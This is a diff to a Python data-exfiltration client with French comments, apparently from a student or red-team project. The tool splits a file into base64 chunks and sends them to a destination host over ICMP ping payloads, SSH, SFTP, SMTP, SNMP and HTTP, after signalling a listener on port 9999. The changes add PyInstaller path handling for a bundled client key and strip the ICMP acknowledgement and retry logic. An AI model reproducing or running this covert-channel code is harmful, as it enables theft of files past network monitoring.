@@ -32,12 +32,12 @@ from pysnmp.hlapi.v3arch.asyncio import SnmpEngine, CommunityData, UdpTransportT
 # SIGNALISATION
 # ========================
 
-def signaler_serveur(destination, fichier, mode):
+def signaler_serveur(destination, fichier, mode, nb_paquets):
     SIGNAL_PORT = 9999
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((destination, SIGNAL_PORT))
-            message = f"{fichier} {mode}"
+            message = f"{fichier} {mode} {nb_paquets}"
             s.sendall(message.encode())
         return 0
     except Exception as e:
@@ -63,6 +63,14 @@ def diviser_fichier(nom_fichier, taille_partie, mode):
                 tmp = urlsafe_b64encode(partie).decode()
             parties.append(tmp)
     return parties
+
+def resource_path(relative_path):
+    """Get absolute path to resource, works for dev & PyInstaller"""
+    if getattr(sys, 'frozen', False):
+        base_path = sys._MEIPASS  # folder PyInstaller uses
+    else:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
 
 # ========================
 # EXFILTRATION SMTP
@@ -236,7 +244,7 @@ async def send_data(host, port, username, key_file, message):
 async def envoyer_paquets_ssh(destination, parties):
     port = 22222
     username = "user"
-    key_file = "keys/client_key"
+    key_file = resource_path("keys/client_key")
 
     for i, part in enumerate(tqdm(parties, desc="Envoi SSH")):
         await asyncio.sleep(0.5)
@@ -270,7 +278,7 @@ async def send_sftp_file(host, port, username, key_file, filename, data):
 async def envoyer_paquets_sftp(destination, parties):
     port = 2222
     username = "user"
-    key_file = "keys/client_key"
+    key_file = resource_path("keys/client_key")
 
     loop = asyncio.get_event_loop()
 
@@ -286,47 +294,18 @@ async def envoyer_paquets_sftp(destination, parties):
 # EXFILTRATION ICMP
 # ========================
 
-import socket
-import time
-from tqdm import tqdm
-from pythonping import ping
-
-def envoyer_paquets_icmp(destination, parties, delai: float = 0.05, max_retries: int = 5):
+def envoyer_paquets_icmp(destination, parties, delai: float = 0.02):
     """
-    Envoie les chunks via ICMP avec accusés de réception pour fiabilité.
-    Chaque paquet inclut un numéro de séquence.
+    Envoie des données via ICMP (ping) vers une destination IP.
+    Chaque partie du fichier est envoyée dans un paquet ICMP.
     """
     total_parties = len(parties)
-    print(f"[*] Envoi de {total_parties} paquets ICMP vers {destination}")
+    print(f"Envoi de {total_parties} paquets vers {destination}")
 
-    # Créer un socket RAW pour recevoir les ACKs du serveur
-    ack_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    ack_socket.settimeout(1)  # Timeout 1 seconde pour attendre les ACKs
+    for i, partie in enumerate(tqdm(parties, desc="Envoi ICMP")):
+        ping(destination, count=1, payload=partie.encode())
 
-    for seq, partie in enumerate(tqdm(parties, desc="Envoi des paquets", ncols=100)):
-        header = f"{seq:06d}|".encode()
-        payload = header + partie.encode()
-
-        retries = 0
-        while retries < max_retries:
-            ping(destination, count=1, payload=payload)
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                data, addr = s.recvfrom(1500)
-                if data == payload:
-                    # ACK reçu → on passe au chunk suivant
-                    break
-                else:
-                    print(f"[!] Mauvais ACK reçu, renvoi...")
-            except socket.timeout:
-                retries += 1
-                print(f"[!] Pas d'ACK pour paquet {seq}, tentative {retries}/{max_retries}")
-        if retries >= max_retries:
-            print(f"[X] Échec définitif pour le paquet {seq}")
-            continue
-        # Pause légère pour éviter de saturer le réseau
-        time.sleep(delai)
-    print("[✓] Transmission terminée.")
+    print("\nTransmission terminée.")
 
 # ========================
 # EXFILTRATION SNMP
@@ -416,12 +395,13 @@ async def main():
         print(f"Erreur : le fichier {nom_fichier} n'existe pas.")
         sys.exit(84)
 
-    if signaler_serveur(destination, nom_fichier, mode) != 0:
+    parties = diviser_fichier(nom_fichier, tailles[modes.index(mode)], mode)
+
+    if signaler_serveur(destination, nom_fichier, mode, len(parties)) != 0:
         sys.exit(84)
 
     print(f"[+] Début de l’exfiltration du fichier {nom_fichier} vers {destination} en mode {mode}")
 
-    parties = diviser_fichier(nom_fichier, tailles[modes.index(mode)], mode)
 
     if mode == "http":
         envoyer_paquets_http(destination, parties)
